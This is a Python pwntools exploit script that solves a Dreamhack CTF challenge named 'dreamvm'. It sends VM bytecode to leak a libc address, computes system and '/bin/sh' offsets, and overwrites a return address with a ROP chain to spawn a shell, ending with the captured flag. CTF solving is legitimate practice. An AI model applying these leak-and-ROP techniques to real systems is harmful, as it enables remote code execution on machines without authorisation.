from pwn import *
import time

def solve():
    LOCAL = False
    if LOCAL:
        r = process('./dreamvm_patched')
        libc = ELF("./libc.so.6")

        context.terminal=['kitty']
    else:
        # r = remote('host8.dreamhack.games', 15396)
        r = remote('host3.dreamhack.games', 16705)
        libc = ELF("./libc.so.6")

    # print(payload.hex())
    # print(r.recvline().hex())
       
    f = open('payload', 'wb')
    payload = b''
    payload += b'\x04'
    payload += b'\x30' + b'\x00' * 0x7 # add 10, and subtract 10 to get the address once leaked 
    payload += b'\x02'
    payload += b'\x05'
    # up to here, we have our leak 

    # write 0x41 into return address
    payload += b'\x04' # this moves the address of the return address to the current stack pointer
    payload += b'\xf8' + b'\xff' * 0x7 # subtract 08
    payload += b'\x02' # move the stack address into the memory store 
    payload += b'\x06' # read into memory store
    payload += b'\x01' # i cant remember what this is for but it's important

    payload += b'\xff' * (0x100 - len(payload)- 1 ) + b'\xfe'
    # why does this fail when only 0x100 bytes is sent???
    # payload += b'\x00' * 8 # write data into the memory store
    # payload += b'\x90\x05\x40'
    pop_rdi = 0x0000000000400903
    back_to_main = 0x0000000000400590 # no idea why i can't go back into main???
    payload += p64(back_to_main)


    # payload += p64(0x0000000000400590) # back into main 
    print(payload.hex())
    print(hex(len(payload)))
    f.write(payload)
    f.close()

    r.send(payload)

    leak = int(r.recv()[::-1].hex()[2:],16) - 243
    print(f"leak: {hex(leak)}")
    print(libc.symbols['__libc_start_main'])
    libc.address = leak - libc.symbols['__libc_start_main']
    # input()
    #
    binsh = next(libc.search("/bin/sh"))
    system = libc.sym['system']
    ex = libc.sym['exit']
    print(f"binsh: {hex(binsh)}")
    print(f"system: {hex(system)}")
    print(f"exit: {hex(ex)}")
    one_gadget = libc.address + 0xe3b04
    print(f"one gadget: {hex(one_gadget)}")

       
    # gdb.attach(r)
    # overwrite return address with one gadget
    # craft second payload
    f = open('./payload', 'wb')
    payload_2 = b'\x04' # this moves the address of the return address to the current stack pointer
    payload_2 += b'\x30' + b'\x00' * 0x7 # subtract 08
    payload_2 += b'\x02' # move the stack address into the memory store 
    payload_2 += b'\x06' # read into memory store the value for pop_rdi
    payload_2 += b'\x01' # assign stack value as value in memory store

    # rsp is currently at 0xe2e0 - 8
    payload_2 += b'\x04'
    payload_2 += b'\x08' + b'\x00' * 0x7 # write binsh
    payload_2 += b'\x02'
    payload_2 += b'\x06' # read into memory store the value for pop_rdi
    payload_2 += b'\x01' # assign stack value as value in memory store

    payload_2 += b'\x04'
    payload_2 += b'\x08' + b'\x00' * 0x7 # write system
    payload_2 += b'\x02'
    payload_2 += b'\x06' # read into memory store the value for pop_rdi
    payload_2 += b'\x01' # assign stack value as value in memory store

    payload_2 += b'\x04'
    payload_2 += b'\x08' + b'\x00' * 0x7 # write exit
    payload_2 += b'\x02'
    payload_2 += b'\x06' # read into memory store the value for pop_rdi
    payload_2 += b'\x01' # assign stack value as value in memory store


    # payload_2 += b'\x06' # read in binsh
    # payload_2 += b'\x02' # inc stack pointer
    # payload_2 += b'\x06' # read in system
    # payload_2 += b'\x06' # read in exit


    payload_2 += b'\xff' * (0x100 - len(payload_2)- 1 ) + b'\xfe'
    # payload_2 += b'\x41' * 8
    payload_2 += p64(pop_rdi)
    payload_2 += p64(binsh)
    payload_2 += p64(system)
    payload_2 += p64(ex)
    f.write(payload + payload_2) # combine both when doing stuff in gdb
    f.close()
    print('wrote payload2')
    r.send(payload_2)

    r.interactive()



def make_payload():
    f = open('./payload', 'wb')
    payload = b''
    # get leak using read 
    payload += b'\x04'
    # local:
    payload += b'\x30' + b'\x00' * 0x7 # add 10, and subtract 10 to get the address once leaked 
    #
    # remote:
    # 0xb0 looks like it gives a cookie
    # okay add 0xb0, then subtract 0x58 gives us stack smashing, meaning 0xb0 - 0x58 = cookie so 0x80 is a return address?
    # payload += b'\xb8' + b'\x00' * 0x7 # add 0xb0,
    payload += b'\x02'
    payload += b'\x05'
    # up to here, we have our leak 

    # write 0x41 into return address
    payload += b'\x04' # this moves the address of the return address to the current stack pointer
    payload += b'\xf8' + b'\xff' * 0x7
    payload += b'\x02' # move the stack address into the memory store 
    payload += b'\x06' # read into memory store
    payload += b'\x01'
    payload += b'\xff' * (0x100 - len(payload)- 1 ) + b'\xfe'
    payload += b'\x41' * 8 # write data into the memory store

    # 

    '''
    this gives us a crash
    '''
    f.write(payload)
    f.close()
    return payload

def remote_stack_leak():
   
    stack_vals = []
    for i in range(0x10, 0x100, 0x08):

        # r = remote('host8.dreamhack.games', 15396)
        r = process('./dreamvm_patched')
        payload = b''
        payload += b'\x04'
        payload += int.to_bytes(i) + b'\x00' * 0x7 # add 0xb0,
        payload += b'\x02'
        payload += b'\x05'
        payload += b'\xff' * (0x100 - len(payload)- 1 ) + b'\xfe'
        # print(payload.hex())

        r.send(payload)
        leak = int(r.recvline()[::-1].hex()[2:],16)
        print(hex(leak))
        stack_vals.append(leak)
        time.sleep(1)
    for i in stack_vals:
        print(hex(i))

def main():
    # payload = make_payload()
    solve()
    # remote_stack_leak()


if __name__ == '__main__':
    main()
    # flag: DH{h4ha-mi541gned-5t4ck-po1n7er-g0-brrrrrrrrr}

